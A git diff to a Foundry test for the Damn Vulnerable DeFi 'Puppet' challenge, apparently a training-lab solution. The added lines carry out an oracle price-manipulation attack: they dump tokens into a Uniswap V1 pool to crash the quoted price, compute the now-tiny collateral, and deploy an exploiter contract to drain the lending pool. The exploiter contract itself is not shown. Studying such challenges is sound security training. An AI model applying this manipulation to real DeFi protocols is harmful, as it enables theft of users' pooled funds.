@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
+import {PuppetExploiter} from "../../src/puppet/PuppetExploiter.sol";
 
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -93,6 +94,17 @@ contract PuppetChallenge is Test {
      */
     function test_puppet() public checkSolvedByPlayer {
         
+        // Approve Uniswap to spend DVT tokens
+        token.approve(address(uniswapV1Exchange), 1000e18);
+
+        // Exchange tokens to ETH to manipulate the price
+        uniswapV1Exchange.tokenToEthSwapInput(1000e18, 1, block.timestamp + 1);
+
+        // Get the deposit required after price manipulation
+        uint256 depositRequired = lendingPool.calculateDepositRequired(100000e18);
+
+        // Deploy the exploit contract
+        new PuppetExploiter{value: depositRequired}(address(lendingPool),100000e18, recovery);
     }
 
     // Utility function to calculate Uniswap prices
